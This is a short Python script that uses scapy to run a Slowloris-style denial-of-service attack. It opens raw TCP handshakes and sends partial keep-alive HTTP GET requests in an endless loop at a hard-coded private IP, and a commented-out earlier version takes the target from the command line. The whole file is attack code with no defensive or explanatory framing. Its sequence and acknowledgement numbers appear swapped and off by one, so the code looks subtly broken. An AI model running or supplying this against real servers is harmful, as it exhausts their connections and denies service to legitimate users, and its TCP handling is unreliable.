import sys
from scapy.all import *
import time
# if len(sys.argv) != 4:
#     print "Usage: ./slowloris.py <target-ip> <starting-source-port> <number-of-GETs>"
#     sys.exit(1)

# target = sys.argv[1]
# sp = int(sys.argv[2])
# numgets = int(sys.argv[3])

# print "Attacking ", target, " with ", numgets, " GETs"

# i = IP()
# i.dst = target
# print "IP layer prepared: ", i.summary()

# for s in range(sp, sp+numgets-1):
#     t = TCP()
#     t.dport = 80
#     t.sport = s
#     t.flags = "S"
#     ans = sr1(i/t, verbose=0)
#     t.seq = ans.ack
#     t.ack = ans.seq + 1
#     t.flags = "A"
#     get = "GET / HTTP/1.1\r\nHost: " + target
#     ans = sr1(i/t/get, verbose=0)
#     print "Attacking from port ", s
# print "Done!"
 

def slowloris(target_ip, tcp_connection_amount):
    ip_info = IP()
    ip_info.dst = target_ip
    connections = []
    start_port = 49153
    conf.L3socket = L3RawSocket
    while True:
        
        time.sleep(10)
        for port_num in range(start_port, start_port+tcp_connection_amount):
            tcp_packet = TCP(
                dport = 49152,
                sport = port_num,
                flags = "S"
            )
            # SYN
            SYN = ip_info/tcp_packet
            ans = sr1(SYN, verbose=0)
            # print(ans)

            # SYN-ACK
            tcp_packet.ack = ans.seq
            tcp_packet.seq = ans.ack + 1
            tcp_packet.flags = "A"
            get = "GET / HTTP/1.1\r\nHost: " + ip_info.dst + "\r\nConnection: keep-alive\r\n"
            ans = sr1(ip_info/tcp_packet/get, verbose=0)
            # print(ans)

            # Partial HTTP GET request
            # ans = sr1(ip_info/tcp_packet/get, verbose=0)
            # print(ans.show())
            connections.append(tcp_packet)
    # Keep all the connections alive
    # print("keeping alive")
    # while True:
        # for tcp_packet in connections:
            # ans = sr1(ip_info/tcp_packet/"X", verbose=1)
        
        
    
if __name__ == "__main__":
    slowloris("192.168.11.40", 100)